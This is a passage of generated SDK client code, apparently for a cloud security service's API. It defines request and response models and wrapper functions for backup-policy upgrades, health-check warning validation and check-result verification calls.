  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'UpgradeBackupPolicyVersion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function upgradeBackupPolicyVersion(request: UpgradeBackupPolicyVersionRequest): UpgradeBackupPolicyVersionResponse {
  var runtime = new Util.RuntimeOptions{};
  return upgradeBackupPolicyVersionWithOptions(request, runtime);
}

model ValidateHcWarningsRequest {
  riskIds?: string(name='RiskIds'),
  sourceIp?: string(name='SourceIp'),
  uuids?: string(name='Uuids'),
}

model ValidateHcWarningsResponseBody = {
  requestId?: string(name='RequestId'),
}

model ValidateHcWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ValidateHcWarningsResponseBody(name='body'),
}

async function validateHcWarningsWithOptions(request: ValidateHcWarningsRequest, runtime: Util.RuntimeOptions): ValidateHcWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.riskIds)) {
    query['RiskIds'] = request.riskIds;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ValidateHcWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function validateHcWarnings(request: ValidateHcWarningsRequest): ValidateHcWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return validateHcWarningsWithOptions(request, runtime);
}

model VerifyCheckInstanceResultRequest {
  checkId?: long(name='CheckId'),
  instanceIds?: [ string ](name='InstanceIds'),
}

model VerifyCheckInstanceResultResponseBody = {
  data?: {
    failInstances?: [ string ](name='FailInstances'),
    operateCode?: string(name='OperateCode'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
}

model VerifyCheckInstanceResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: VerifyCheckInstanceResultResponseBody(name='body'),
}

async function verifyCheckInstanceResultWithOptions(request: VerifyCheckInstanceResultRequest, runtime: Util.RuntimeOptions): VerifyCheckInstanceResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.instanceIds)) {
    query['InstanceIds'] = request.instanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'VerifyCheckInstanceResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function verifyCheckInstanceResult(request: VerifyCheckInstanceResultRequest): VerifyCheckInstanceResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return verifyCheckInstanceResultWithOptions(request, runtime);
}

model VerifyCheckResultRequest {
  checkIds?: [ long ](name='CheckIds'),
}

model VerifyCheckResultResponseBody = {
  data?: {
    operateCode?: string(name='OperateCode'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
}

model VerifyCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: VerifyCheckResultResponseBody(name='body'),
}

async function verifyCheckResultWithOptions(request: VerifyCheckResultRequest, runtime: Util.RuntimeOptions): VerifyCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'VerifyCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function verifyCheckResult(request: VerifyCheckResultRequest): VerifyCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return verifyCheckResultWithOptions(request, runtime);
}

